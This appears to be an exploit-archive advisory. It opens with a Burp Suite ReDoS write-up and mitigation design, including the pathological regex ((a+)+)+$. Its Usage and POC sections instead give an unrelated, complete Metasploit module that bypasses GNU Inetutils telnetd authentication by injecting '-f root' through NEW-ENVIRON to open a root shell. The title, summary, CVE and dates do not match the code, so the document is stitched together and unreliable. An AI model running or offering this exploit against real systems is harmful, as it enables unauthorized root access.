@@ -1,0 +1,244 @@
+=============================================================================================================================================
+| # Title     : Burp Suite Global Match and Replace 1.0.0 Regular Expression Denial of Service (ReDoS) via Catastrophic Backtracking        |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace                                            |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/214143/
+
+[+] Summary    : The Global Match & Replace feature in Burp Suite relies directly on Java’s default regular expression engine (java.util.regex). 
+                 This engine is implemented as a Non-deterministic Finite Automaton (NFA), which is inherently vulnerable to catastrophic backtracking when processing certain regex patterns.
+                 As a result, a single poorly designed (or maliciously crafted) regular expression can trigger exponential time complexity, 
+				 leading to a complete freeze of Burp Suite’s user interface or total application crash. This represents a local Denial of Service (DoS) condition that directly affects the stability of the testing environment.
+                 This project transforms the extension from a potentially unstable component into a hardened, production-grade module by introducing multi-layered safety circuit breakers that detect and stop ReDoS conditions before they impact Burp Suite.
+
+[+] Vulnerability Root Cause Analysis :
+
+The root causes of the vulnerability were identified in the original design as follows:
+
+1. Unbounded Regex Execution :matcher(updated).replaceAll(...)
+
+Issue: Execution of regex operations with no time or resource limits.
+
+Impact: CPU exhaustion due to exponential backtracking.
+
+2. UI Thread Blocking :updatePreview(); // executed inside addActionListener
+
+[+] Issue: Heavy regex computation executed on the UI (Event Dispatch Thread).
+
+[+] Impact: Complete UI freeze, preventing any user interaction.
+
+3. Blind Trust in matcher.find()
+matcher.find()
+
+[+] Issue: Assumption that regex search is safe and linear.
+
+[+] Reality: This call is the exact point where catastrophic backtracking occurs in NFA-based engines.
+
+Hardened Architecture (Mitigation Design)
+
+The redesigned engine introduces three defensive layers:
+
+A. Thread Isolation Layer
+
+All regex execution is moved into an isolated ExecutorService.
+
+Guarantees that Burp Suite’s UI remains responsive even if regex execution stalls.
+
+B. Interruption Checkpoint Layer
+
+Regex input is wrapped using an InterruptibleCharSequence, forcing the engine to check interruption state during backtracking:
+
+if (Thread.currentThread().isInterrupted()) {
+    throw new RegexInterruptedException(
+        "ReDoS behavior forced thread interruption."
+    );
+}
+
+This converts Java’s cooperative interruption model into an enforced control mechanism.
+
+C. Time Ceiling (Future Timeout)
+
+Each regex operation is restricted to a 2-second execution window.
+
+If exceeded, the task is forcefully cancelled and classified as a ReDoS condition.
+
+[+] Workflow / Usage Scenario :
+
+User defines a regex rule (example):
+
+((a+)+)+$
+
+User clicks Test Rule.
+
+The safe validation engine is triggered.
+
+If a ReDoS pattern is detected:
+
+ CRITICAL: ReDoS Detected!
+
+The rule is automatically blocked from being applied to live traffic, protecting the active Burp session.
+
+Technical Conclusion
+
+This mitigation bridges the gap between syntactically valid regex patterns and the real-world execution constraints of the JVM.
+
+Since Java thread interruption is inherently cooperative, the solution forces cooperation by injecting interruption checkpoints directly into the input consumed by the regex engine.
+
+[+] Result:
+
+No UI freeze
+
+No Burp Suite crash
+
+No loss of active testing sessions
+
+The Global Match & Replace feature becomes a security-aware component, not merely a utility.
+
+[+] Usage : 
+
+# 1. Select the module
+use exploit/unix/telnet/gnu_inetutils_bypass
+
+# 2. Set the target IP
+set RHOSTS <TARGET_IP>
+
+# 3. Set your local options (though this exploit doesn't use a standard payload, 
+# it's good practice for MSF metrics)
+set LHOST <YOUR_IP>
+
+# 4. Check the options
+show options
+
+# 5. Execute the exploit
+exploit
+
+[+] POC :
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+module Msf
+module Sessions
+class InetutilsTelnetd < Msf::Sessions::CommandShell
+  def self.type
+    "inetutils_telnetd"
+  end
+
+  def self.desc
+    "GNU Inetutils telnetd command shell"
+  end
+
+  def self.create_session(sock, opts = {})
+    return nil unless sock && sock.respond_to?(:put)
+
+    begin
+      token = Rex::Text.rand_text_alphanumeric(10)
+      sock.put("echo #{token}\r\n")
+      
+      3.times do
+        Rex.sleep(0.5)
+        response = sock.get_once(-1, 2)
+        if response && response.include?(token)
+          return self.new(sock, opts)
+        end
+      end
+    rescue ::Exception => e
+      elog("InetutilsTelnetd Session validation failed: #{e.message}")
+    end
+    nil
+  end
+end
+end
+end
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Telnet
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'            => 'GNU Inetutils telnetd NEW-ENVIRON Authentication Bypass',
+      'Description'     => %q{
+        This module exploits a logic flaw in GNU Inetutils telnetd (CVE-1999-0192).
+        By craftily handling the NEW-ENVIRON option negotiation, it's possible to 
+        pass flags like -f root through the USER environment variable, bypassing 
+        the login authentication process entirely.
+      },
+      'Author'          => ['indoushka'],
+      'License'         => MSF_LICENSE,
+      'References'      => [ ['CVE', '1999-0192'] ],
+      'DisclosureDate'  => 'Dec 12 1994',
+      'Platform'        => 'unix',
+      'Arch'            => ARCH_CMD,
+      'Privileged'      => true,
+      'SessionTypes'    => [ 'inetutils_telnetd' ],
+      'DefaultOptions'  => {
+        'SESSION' => 'inetutils_telnetd'
+      },
+      'Targets'         => [ ['Automatic', {}] ],
+      'DefaultTarget'   => 0
+    ))
+
+    register_options([
+      OptString.new('USER_PAYLOAD', [ true, 'The login flags for bypass', '-f root' ])
+    ])
+  end
+
+  def exploit
+    session = nil
+    
+    print_status("Connecting to #{rhost}:#{rport}...")
+    connect
+
+    sock.telnet_options[:negotiation] = false
+
+    begin
+      timeout = 6
+      while (data = sock.get_once(-1, timeout))
+        
+        if data.include?("\xff\xfa\x27\x01")
+          print_good("NEW-ENVIRON request detected. Injecting crafted USER payload...")
+
+          buf = "\xff\xfa\x27\x00\x00" + "USER" + "\x01" + datastore['USER_PAYLOAD'] + "\xff\xf0"
+          sock.put(buf)
+          
+          Rex.sleep(1)
+          print_status("Bypass sent. Validating session with a challenge-response token...")
+          session = Msf::Sessions::InetutilsTelnetd.create_session(
+            sock,
+            rhost: rhost,
+            rport: rport,
+            platform: 'unix'
+          )
+
+          if session
+            print_good("Success! Authentication bypassed. Session #{session.sid} opened.")
+            self.register_session(session)
+            return
+          end
+
+          fail_with(Failure::NoAccess, 'Bypass sequence failed to drop into a shell.')
+        end
+      end
+
+      fail_with(Failure::Unreachable, 'Target did not initiate NEW-ENVIRON subnegotiation.')
+
+    rescue ::EOFError
+      fail_with(Failure::Disconnected, 'Remote host terminated the connection.')
+    rescue ::Exception => e
+      fail_with(Failure::Unknown, "Exploit failed: #{e.class} - #{e.message}")
+    ensure
+     
+      disconnect unless session
+    end
+  end
+end
+	
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
